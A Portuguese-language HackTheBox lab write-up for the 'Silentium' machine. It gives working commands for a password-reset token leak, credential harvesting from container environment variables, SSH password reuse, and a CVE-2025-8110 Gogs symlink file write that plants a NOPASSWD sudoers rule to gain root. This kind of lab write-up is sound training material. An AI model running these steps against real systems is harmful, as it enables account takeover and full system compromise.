# Silentium - HackTheBox Writeup

**Dificuldade:** Easy  
**Máquina:** Silentium  
**Autor:** Andrey Soares  
**Status:** Root obtido

---

## 1. Reconhecimento

Comecei realizando o reconhecimento inicial da máquina para identificar os serviços expostos.

```bash
nmap -sV -p- --min-rate 5000 <IP>
```

Portas identificadas:

- **22/tcp** - SSH
- **80/tcp** - HTTP

Após identificar o serviço web, adicionei o domínio principal no arquivo `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

Entrada adicionada:

```txt
<IP> silentium.htb
```

---

## 2. Enumeração de VHOSTs

Com o domínio principal resolvendo corretamente, parti para enumeração de subdomínios/vhosts usando o Gobuster.

```bash
gobuster vhost \
  -u http://silentium.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 50
```

Resultado encontrado:

```txt
staging.silentium.htb Status: 200
```

![Gobuster VHOST](images/08_gobuster_vhost.png)

O subdomínio encontrado também foi adicionado ao `/etc/hosts`.

```txt
<IP> silentium.htb staging.silentium.htb
```

---

## 3. Análise do Subdomínio `staging.silentium.htb`

Acessando o subdomínio, encontrei uma aplicação web com fluxo de recuperação de senha.

Durante a análise das rotas da aplicação, identifiquei o endpoint de recuperação de senha:

```txt
/api/v1/account/forgot-password
```

Testei o endpoint com uma requisição `POST` enviando o e-mail do usuário alvo.

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq
```

A resposta retornou dados sensíveis do usuário, incluindo o token temporário de redefinição de senha.

![Forgot Password Token Leak](images/09_forgot_password_token_leak.png)

Essa falha permitiu controlar o fluxo de recuperação de senha. O backend não deveria retornar o `tempToken` diretamente na resposta da API.

---

## 4. Reset de Senha

Com o token temporário obtido, acessei a página de recuperação de senha.

![Forgot Password Page](images/10_forgot_password_page.png)

Na tela de reset, informei:

- E-mail do usuário
- Reset token obtido pela API
- Nova senha válida conforme a política da aplicação

![Reset Password Page](images/11_reset_password_page.png)

Após enviar o formulário, a senha foi redefinida com sucesso.

---

## 5. Acesso ao Flowise

Depois do reset, realizei login na aplicação com a nova senha configurada.

O painel do Flowise foi acessado com sucesso.

![Flowise Dashboard](images/12_flowise_dashboard.png)

Nesse ponto, o acesso autenticado à aplicação foi obtido.

---

## 6. Remote Code Execution no Flowise

Com acesso ao Flowise, criei uma nova API key pela interface da aplicação.

Depois disso, usei a API key para interagir com endpoints internos e validar execução de comandos no ambiente do Flowise.

O resultado foi uma reverse shell como **root dentro do container**.

```bash
nc -lvnp 4444
```

Validação dentro da shell:

```bash
whoami
```

Resultado:

```txt
root
```

![Container Root Shell](images/13_container_root_env.png)

Importante: esse root era do container, não do host.

---

## 7. Enumeração do Container

Dentro do container, enumerei variáveis de ambiente em busca de credenciais reutilizáveis.

```bash
env | grep -i pass
```

Foram encontradas credenciais sensíveis:

```txt
FLOWISE_PASSWORD=<redacted>
SMTP_PASSWORD=<redacted>
```

A senha do `SMTP_PASSWORD` foi reutilizada para autenticar no host como o usuário `ben`.

---

## 8. Movimento para o Host - Usuário `ben`

Com a senha encontrada no container, testei o acesso SSH no host.

```bash
ssh ben@silentium.htb
```

O login foi bem-sucedido, confirmando reutilização de senha entre o container e o host.

Com isso, o acesso passou de root no container para usuário **ben** no host.

---

## 9. Enumeração Local como `ben`

No host, enumerei processos e portas locais para identificar serviços internos.

```bash
ps aux | grep gogs
ss -tuln | grep 300
```

Foi identificado que o **Gogs** estava rodando localmente como **root** nas portas:

```txt
127.0.0.1:3000
127.0.0.1:3001
```

Também foi localizada a configuração da aplicação:

```txt
/opt/gogs/gogs/custom/conf/app.ini
```

Esse ponto foi importante porque o Gogs estava inacessível externamente, mas acessível localmente pelo host.

---

## 10. Port Forward para Acessar o Gogs

Para acessar a interface web do Gogs pelo navegador local, fiz um port forward via SSH.

```bash
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb
```

Depois, acessei no navegador:

```txt
http://localhost:8080
```

Na interface do Gogs, registrei uma conta chamada `kali` e criei um **Personal Access Token** com permissões suficientes para manipular repositórios via API.

---

## 11. Preparação do Exploit - CVE-2025-8110

O próximo vetor foi o **CVE-2025-8110**, uma vulnerabilidade de arbitrary file write no Gogs usando symlink e a API `PutContents`.

Criei um repositório no Gogs chamado `exploit2`.

No Kali, preparei um repositório local contendo um symlink apontando para `/etc/sudoers.d/ben`.

```bash
mkdir exploit2
cd exploit2
git init
git config user.email "kali@kali.local"
git config user.name "kali"
ln -s /etc/sudoers.d/ben malicious_link
git add malicious_link
git commit -m "symlink exploit"
```

Depois adicionei o remote com o token do Gogs:

```bash
git remote add origin http://kali:<TOKEN>@localhost:8080/kali/exploit2.git
```

Na primeira tentativa, o push falhou porque o repositório remoto já possuía conteúdo.

![Gogs Push Rejected](images/14_gogs_symlink_push_rejected.png)

O erro indicou que seria necessário sincronizar ou forçar o push.

---

## 12. Envio do Symlink para o Repositório

Como o objetivo era sobrescrever o conteúdo remoto do repositório de teste, usei `--force`.

```bash
git push --force origin master
```

O push foi aceito e o symlink foi enviado para o repositório.

![Gogs Force Push Success](images/15_gogs_force_push_success.png)

Nesse ponto, o repositório remoto continha o arquivo `malicious_link`, que na verdade era um symlink para:

```txt
/etc/sudoers.d/ben
```

---

## 13. Exploração da Vulnerabilidade - Arbitrary File Write

Com o symlink já presente no repositório, usei a API `PutContents` do Gogs para atualizar o arquivo `malicious_link`.

Como o Gogs processava incorretamente o symlink, o conteúdo enviado pela API era escrito no destino real do symlink.

Destino real:

```txt
/etc/sudoers.d/ben
```

Comando usado:

```bash
curl -X PUT "http://localhost:8080/api/v1/repos/kali/exploit2/contents/malicious_link" \
  -H "Authorization: token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"message":"exploit","content":"YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg=="}'
```

O conteúdo em base64 corresponde a:

```txt
ben ALL=(ALL) NOPASSWD: ALL
```

A resposta da API confirmou que o arquivo foi atualizado.

![Gogs PutContents Symlink Write](images/16_gogs_putcontents_symlink_write.png)

---

## 14. Escalada para Root

Após escrever a regra no sudoers, voltei para a shell como `ben` e executei:

```bash
sudo -i
```

Como a regra `NOPASSWD` havia sido adicionada em `/etc/sudoers.d/ben`, o usuário `ben` conseguiu escalar para root sem senha.

Validação esperada:

```bash
whoami
```

Resultado:

```txt
root
```

Root flag:

```bash
cat /root/root.txt
```

---

## 15. Resumo da Cadeia de Exploração

A cadeia completa foi:

1. Enumeração do domínio principal.
2. Descoberta do vhost `staging.silentium.htb`.
3. Exploração do endpoint de recuperação de senha que vazava o `tempToken`.
4. Reset da senha do usuário `ben`.
5. Login no Flowise.
6. Criação de API key e exploração pós-login para obter RCE no container.
7. Enumeração de variáveis de ambiente no container.
8. Descoberta de senha reutilizada em `SMTP_PASSWORD`.
9. SSH no host como `ben`.
10. Enumeração local e descoberta do Gogs rodando como root.
11. Port forward para acessar o Gogs local.
12. Criação de repositório com symlink para `/etc/sudoers.d/ben`.
13. Uso da API `PutContents` para escrever no destino do symlink.
14. Adição de regra sudo `NOPASSWD` para `ben`.
15. Escalada final para root.

---

## 16. Principais Falhas Exploradas

### Token leak no reset de senha

A API retornava o token temporário diretamente na resposta da requisição de recuperação de senha.

Impacto:

```txt
Account takeover do usuário ben
```

### RCE pós-autenticação no Flowise

O acesso autenticado permitiu abusar de funcionalidades internas da aplicação para obter execução de comandos no container.

Impacto:

```txt
Shell como root dentro do container
```

### Reutilização de senha

A senha encontrada em variável de ambiente no container também funcionava no host para o usuário `ben`.

Impacto:

```txt
Movimento lateral do container para o host
```

### Gogs rodando como root

O Gogs estava escutando localmente e executando com privilégios elevados.

Impacto:

```txt
Qualquer arbitrary file write no Gogs poderia afetar arquivos privilegiados do sistema
```

### CVE-2025-8110 - Arbitrary File Write via Symlink

A API `PutContents` permitiu escrever conteúdo no destino de um symlink versionado no repositório.

Impacto:

```txt
Escrita em /etc/sudoers.d/ben e escalação para root
```

---

## 17. Conclusão

A máquina Silentium combinou falhas web, exposição de segredo, reutilização de senha e abuso de serviço interno privilegiado.

O ponto mais crítico foi a combinação entre:

```txt
Gogs rodando como root + arbitrary file write via symlink
```

Isso permitiu transformar o acesso do usuário `ben` em acesso root no host.
